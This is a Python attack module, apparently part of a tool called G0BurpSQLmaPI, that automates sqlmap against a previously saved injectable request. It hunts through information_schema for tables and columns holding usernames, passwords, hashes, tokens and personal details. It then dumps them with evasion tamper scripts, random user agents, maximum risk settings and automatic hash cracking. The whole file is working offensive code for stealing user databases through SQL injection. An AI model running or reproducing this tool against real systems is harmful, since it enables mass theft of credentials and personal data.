#!/usr/bin/env python3
"""
G0BurpSQLmaPI - Users Dump Module
Dumps users and finds all tables containing user data
Preserves original sqlmap output with colors
Author: nu11secur1ty
License: GPL-3.0
"""

import os
import sys
import json
import time
import shutil
import subprocess
import re
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# ============================================================================
# PATHS
# ============================================================================

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"
AUTH_PATH = MODULES_DIR / "auth_config.json"

# SQLMap configuration
SQLMAP_ENV_VAR = "G0_SQLMAP_PATH"
SQLMAP_DEFAULT_PATHS = [
    "D:/CVE/sqlmap-nu11secur1ty/sqlmap.py",
    "/usr/bin/sqlmap",
    "/usr/local/bin/sqlmap",
    "sqlmap.py",
]

# ============================================================================
# CORE USER TABLE KEYWORDS - ONLY THE MOST COMMON
# ============================================================================

USER_TABLE_KEYWORDS = [
    'user', 'users', 'admin', 'admins', 'member', 'members',
    'login', 'logins', 'account', 'accounts', 'profile', 'profiles',
    'customer', 'customers', 'employee', 'employees', 'staff',
    'auth', 'credentials', 'sessions', 'tokens',
    'role', 'roles', 'permission', 'permissions',
    'wp_users', 'drupal_users', 'joomla_users',
    'admin_users', 'password_reset', 'social_users',
    'usuario', 'usuarios', 'utilisateur', 'benutzer'
]

# ============================================================================
# CORE USER COLUMN KEYWORDS - ONLY THE MOST COMMON
# ============================================================================

USER_COLUMN_KEYWORDS = [
    'user', 'username', 'email', 'password', 'pass', 'login',
    'name', 'fullname', 'first_name', 'last_name', 'phone',
    'mobile', 'address', 'role', 'admin', 'member', 'profile',
    'user_id', 'uid', 'account',
    'user_name', 'nickname', 'display_name', 'user_login',
    'user_email', 'user_pass', 'user_password', 'userid',
    'passwd', 'pwd', 'user_meta', 'user_profile', 'user_roles',
    'auth_token', 'api_token', 'session_id', 'remember_token',
    'password_hash', 'password_salt', 'password_reset',
    'firstname', 'lastname', 'gender', 'country', 'state', 'city',
    'phone_number', 'mobile_number', 'email_address',
    'facebook_id', 'google_id', 'github_id',
    'company', 'department', 'position', 'title',
    'created_at', 'updated_at', 'last_login',
    'is_active', 'is_admin', 'is_verified', 'is_banned',
    'meta_key', 'meta_value', 'user_settings',
    'usuario', 'usuarios', 'utilisateur', 'benutzer'
]

# SQLMAP ANSWERS - automatically answers all questions
SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"

# ============================================================================
# FUNCTIONS
# ============================================================================

def display_banner():
    """Display module banner"""
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║                    👥 USERS DUMP MODULE                       ║
║      SCANS FOR ANY TABLE WITH USER DATA                       ║
║                   Author: nu11secur1ty                        ║
╚═══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

def find_sqlmap():
    """Find sqlmap installation"""
    env_path = os.getenv(SQLMAP_ENV_VAR)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    
    for path in SQLMAP_DEFAULT_PATHS:
        if Path(path).exists():
            return path
    
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def load_exploit():
    """Load exploit file and parameters"""
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        return None, None
    
    try:
        vuln_params = []
        if META_PATH.exists():
            with open(META_PATH, 'r') as f:
                meta = json.load(f)
                vuln_params = meta.get("vuln_params", [])
        return EXPLOIT_PATH, vuln_params
    except Exception as e:
        print(Fore.RED + f"❌ Error loading exploit: {e}" + Style.RESET_ALL)
        return None, None

def run_sqlmap_command(cmd, description=""):
    """
    Run sqlmap command with proper batch mode and answers
    """
    if description:
        print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
    
    # Add batch and answers if not already present
    if "--batch" not in cmd:
        cmd.append("--batch")
    if "--answers" not in cmd:
        cmd.append("--answers=" + SQLMAP_ANSWERS)
    
    print(Fore.YELLOW + "[*] Running sqlmap..." + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        # Run sqlmap directly - PRESERVES COLORS
        result = subprocess.run(cmd, check=False)
        
        # After sqlmap finishes, capture output for parsing
        cmd_capture = cmd.copy()
        capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
        output = capture_result.stdout + capture_result.stderr
        
        return output
        
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}" + Style.RESET_ALL)
        return ""

def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
    """
    Step 1: Find ALL tables that MIGHT contain user data
    """
    print(Fore.CYAN + "\n[+] Scanning for ALL user-related tables..." + Style.RESET_ALL)
    
    # Build SQL query to find ANY table with user-related name
    table_keywords_pattern = " OR ".join([f"TABLE_NAME LIKE '%{kw}%'" for kw in USER_TABLE_KEYWORDS])
    sql_query = f"SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND ({table_keywords_pattern})"
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--time-sec=11",
        "--tamper=space2comment,between,charencode",
        "--no-cast",
        "--no-escape",
        "--sql-query=" + sql_query,
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    print(Fore.YELLOW + "[*] Looking for tables containing: " + ", ".join(USER_TABLE_KEYWORDS[:10]) + "..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
    print("-" * 60)
    
    output = run_sqlmap_command(cmd)
    
    if not output:
        return []
    
    # Extract table names from output
    tables = []
    patterns = [
        r'Table: (\w+)',
        r'\|\s*(\w+)\s*\|',
        r'\[(\w+)\]',
        r'(\w+)\s+\([0-9]+ rows\)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output)
        for match in matches:
            if match and len(match) > 2 and not match.isdigit():
                match_lower = match.lower()
                if any(kw in match_lower for kw in USER_TABLE_KEYWORDS):
                    if match not in tables:
                        tables.append(match)
    
    tables = sorted(set(tables))
    
    if tables:
        print(Fore.GREEN + f"\n[+] Found {len(tables)} potential user tables:" + Style.RESET_ALL)
        for i, table in enumerate(tables, 1):
            print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
        return tables
    else:
        print(Fore.YELLOW + "\n[!] No user tables found by name. Trying to find tables with user columns..." + Style.RESET_ALL)
        return []

def find_all_tables_by_columns(sqlmap_path, exploit_path, vuln_params):
    """
    Step 2: Find tables that contain user-related COLUMNS
    """
    print(Fore.CYAN + "\n[+] Searching for tables with user-related COLUMNS..." + Style.RESET_ALL)
    
    # Build SQL query to find tables with user-related columns
    column_keywords_pattern = " OR ".join([f"COLUMN_NAME LIKE '%{kw}%'" for kw in USER_COLUMN_KEYWORDS])
    sql_query = f"SELECT DISTINCT TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA=database() AND ({column_keywords_pattern})"
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--time-sec=11",
        "--tamper=space2comment,between,charencode",
        "--no-cast",
        "--no-escape",
        "--sql-query=" + sql_query,
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    print(Fore.YELLOW + "[*] Looking for columns containing: " + ", ".join(USER_COLUMN_KEYWORDS[:10]) + "..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
    print("-" * 60)
    
    output = run_sqlmap_command(cmd)
    
    if not output:
        return []
    
    # Extract table names from output
    tables = []
    patterns = [
        r'Table: (\w+)',
        r'\|\s*(\w+)\s*\|',
        r'\[(\w+)\]',
        r'TABLE_NAME: (\w+)',
        r'(\w+)\s+\([0-9]+ rows\)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output)
        for match in matches:
            if match and len(match) > 2 and not match.isdigit():
                if match not in tables:
                    tables.append(match)
    
    tables = sorted(set(tables))
    
    if tables:
        print(Fore.GREEN + f"\n[+] Found {len(tables)} tables with user columns:" + Style.RESET_ALL)
        for i, table in enumerate(tables, 1):
            print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
        return tables
    else:
        print(Fore.YELLOW + "\n[!] No tables with user columns found." + Style.RESET_ALL)
        return []

def get_table_columns(sqlmap_path, exploit_path, vuln_params, table_name):
    """
    Get all columns from a specific table
    """
    print(Fore.CYAN + f"[*] Getting columns from: {table_name}" + Style.RESET_ALL)
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--time-sec=11",
        "--tamper=space2comment,between,charencode",
        "--no-cast",
        "--no-escape",
        "--sql-query=SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='" + table_name + "'",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    output = run_sqlmap_command(cmd)
    
    if not output:
        return []
    
    # Extract column names
    columns = []
    patterns = [
        r'Column: (\w+)',
        r'\|\s*(\w+)\s*\|',
        r'\[(\w+)\]'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output)
        for match in matches:
            if match and len(match) > 1 and not match.isdigit():
                if match not in columns:
                    columns.append(match)
    
    return columns

def check_table_for_user_columns(sqlmap_path, exploit_path, vuln_params, table_name):
    """
    Check if a table has user-related columns
    """
    columns = get_table_columns(sqlmap_path, exploit_path, vuln_params, table_name)
    
    if not columns:
        return []
    
    user_columns = []
    for col in columns:
        col_lower = col.lower()
        if any(keyword in col_lower for keyword in USER_COLUMN_KEYWORDS):
            user_columns.append(col)
    
    if user_columns:
        print(Fore.GREEN + f"    [+] Found user columns: {', '.join(user_columns)}" + Style.RESET_ALL)
        return user_columns
    else:
        return []

def dump_table(sqlmap_path, exploit_path, vuln_params, table_name):
    """
    Dump ALL data from a table
    """
    print(Fore.CYAN + f"\n[+] Dumping ALL data from table: {table_name}" + Style.RESET_ALL)
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--time-sec=11",
        "--tamper=space2comment,between,charencode",
        "--no-cast",
        "--no-escape",
        "--dump",
        f"-T {table_name}",
        "--threads=10",
        "--timeout=30",
        "--retries=3",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    print(Fore.YELLOW + f"[*] Dumping {table_name}..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        # Run sqlmap with batch and answers
        if "--batch" not in cmd:
            cmd.append("--batch")
        if "--answers" not in cmd:
            cmd.append("--answers=" + SQLMAP_ANSWERS)
        
        result = subprocess.run(cmd, check=False)
        
        print(Fore.GREEN + f"\n[+] Completed dumping {table_name}" + Style.RESET_ALL)
        return True
            
    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n[!] Skipped {table_name}" + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.RED + f"❌ Error dumping {table_name}: {e}" + Style.RESET_ALL)
        return False

def get_all_tables(sqlmap_path, exploit_path, vuln_params):
    """
    Get ALL tables from the database
    """
    print(Fore.CYAN + "\n[+] Getting ALL tables from database..." + Style.RESET_ALL)
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=5",
        "--risk=3",
        "--time-sec=11",
        "--tamper=space2comment,between,charencode",
        "--no-cast",
        "--no-escape",
        "--sql-query=SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    output = run_sqlmap_command(cmd)
    
    if not output:
        return []
    
    tables = []
    patterns = [
        r'Table: (\w+)',
        r'\|\s*(\w+)\s*\|',
        r'\[(\w+)\]',
        r'(\w+)\s+\([0-9]+ rows\)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output)
        for match in matches:
            if match and len(match) > 2 and not match.isdigit():
                if match not in tables:
                    tables.append(match)
    
    return sorted(set(tables))

def run_users_dump():
    """Main function - find and dump ALL user tables"""
    display_banner()
    
    # Check if exploit exists
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Find sqlmap
    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "❌ sqlmap not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + f"Set {SQLMAP_ENV_VAR} or install sqlmap." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Load exploit
    exploit_path, vuln_params = load_exploit()
    if not exploit_path:
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show configuration
    print(Fore.CYAN + "\n[*] Configuration:" + Style.RESET_ALL)
    print(f"    SQLMap: {sqlmap_path}")
    print(f"    Exploit: {exploit_path}")
    if vuln_params:
        print(f"    Parameters: {vuln_params}")
    print()
    
    # Confirm
    confirm = input(Fore.YELLOW + "Start DEEP users scan and dump? [Y/n]: " + Style.RESET_ALL).strip().lower()
    if confirm not in ("", "y", "yes"):
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 1: Find tables by name (user, admin, etc.)
    user_tables = find_all_user_tables(sqlmap_path, exploit_path, vuln_params)
    
    # STEP 2: If no tables found by name, find by columns
    if not user_tables:
        user_tables = find_all_tables_by_columns(sqlmap_path, exploit_path, vuln_params)
    
    # STEP 3: If still no tables found, get ALL tables and check each
    if not user_tables:
        print(Fore.YELLOW + "\n[!] No user tables found by name or columns. Getting ALL tables..." + Style.RESET_ALL)
        
        all_tables = get_all_tables(sqlmap_path, exploit_path, vuln_params)
        
        if all_tables:
            print(Fore.CYAN + f"\n[+] Found {len(all_tables)} total tables. Checking each for user columns..." + Style.RESET_ALL)
            print("="*60)
            
            for table in all_tables:
                user_columns = check_table_for_user_columns(sqlmap_path, exploit_path, vuln_params, table)
                if user_columns:
                    user_tables.append(table)
    
    if not user_tables:
        print(Fore.YELLOW + "\n[!] No tables with user data found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] The database may not contain user tables." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show found tables
    print(Fore.CYAN + "\n" + "="*60)
    print("FOUND USER TABLES:")
    print("="*60 + Style.RESET_ALL)
    for i, table in enumerate(user_tables, 1):
        print(f"{i}. {table}")
    print("="*60)
    
    # Ask which tables to dump
    dump_all = input(Fore.YELLOW + "\nDump ALL tables? [Y/n]: " + Style.RESET_ALL).strip().lower()
    
    tables_to_dump = []
    if dump_all in ("", "y", "yes"):
        tables_to_dump = user_tables
    else:
        print(Fore.CYAN + "Enter table numbers to dump (comma-separated, e.g., 1,3,5):" + Style.RESET_ALL)
        selection = input(Fore.YELLOW + "Selection: " + Style.RESET_ALL).strip()
        if selection:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",") if x.strip()]
                tables_to_dump = [user_tables[i] for i in indices if 0 <= i < len(user_tables)]
            except:
                print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
                input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
                return
    
    if not tables_to_dump:
        print(Fore.YELLOW + "No tables selected." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Dump selected tables
    print(Fore.CYAN + "\n" + "="*60)
    print(f"DUMPING {len(tables_to_dump)} USER TABLES")
    print("="*60 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] SQLmap will save results to its default output directory" + Style.RESET_ALL)
    print(Fore.CYAN + "[*] SQLmap output will appear below with original colors:" + Style.RESET_ALL)
    print("="*60)
    
    success_count = 0
    for i, table in enumerate(tables_to_dump, 1):
        print(Fore.CYAN + f"\n[{i}/{len(tables_to_dump)}] Processing: {table}" + Style.RESET_ALL)
        print(Fore.CYAN + "="*60 + Style.RESET_ALL)
        
        if dump_table(sqlmap_path, exploit_path, vuln_params, table):
            success_count += 1
    
    # Summary
    print(Fore.CYAN + "\n" + "="*60)
    print("USERS DUMP COMPLETE")
    print("="*60 + Style.RESET_ALL)
    print(Fore.GREEN + f"✅ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
    print(Fore.YELLOW + "📁 SQLmap saved CSV files in its default output directory" + Style.RESET_ALL)
    print(Fore.CYAN + "💡 Check sqlmap output directory for CSV files with user data" + Style.RESET_ALL)
    print("="*60)
    
    input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

if __name__ == "__main__":
    run_users_dump()
